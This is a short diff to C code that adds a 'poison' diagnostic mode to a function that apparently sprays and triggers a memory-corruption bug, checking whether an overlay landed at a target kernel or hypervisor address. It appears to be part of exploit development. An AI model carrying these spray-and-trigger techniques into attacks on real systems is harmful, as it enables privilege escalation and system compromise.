@@ -312,7 +312,15 @@ void do_pvm_overlay_route(void) {
   char ctlbuf[32];
   struct msghdr msg;
 
-  overlay_fill_iovec(siov, 8, sgi0);
+  if (env_int_range("PVM_POISON", 0, 0, 1)) {
+    /* diagnostic: real flow (spray+trigger) but poison values - if the walk
+       panics on a 0x5300?000 marker the overlay landed; garbage means miss */
+    calib_fill_iovec(siov, 8, PVM_CALIB_BASE_I);
+    pr_info("pvm overlay: POISON diagnostic mode sgi0=%d
+", sgi0);
+  } else {
+    overlay_fill_iovec(siov, 8, sgi0);
+  }
   memset(ctlbuf, 0, sizeof(ctlbuf));
 
   pr_info("pvm overlay: target=%016zx value=%016zx lock=%016zx sgi0=%d "
